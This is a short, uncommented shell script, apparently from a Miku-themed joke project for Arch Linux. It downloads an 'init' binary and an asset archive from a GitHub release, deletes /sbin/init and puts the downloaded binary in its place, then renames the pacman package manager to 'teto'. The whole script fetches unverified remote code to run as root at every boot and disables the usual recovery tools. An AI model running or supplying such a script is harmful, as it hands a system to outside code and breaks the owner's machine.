#!/usr/bin/sh

mkdir -p /miku
cd /miku
wget https://github.com/Hyperion0801/Miku-Miku-Miku/releases/download/AlphaBuild2/Assets.zip
wget https://github.com/Hyperion0801/Miku-Miku-Miku/releases/download/AlphaBuild6/init
chmod +x init
rm /sbin/init
cp init /sbin/init
unzip Assets.zip
mv $(which pacman) /usr/bin/teto
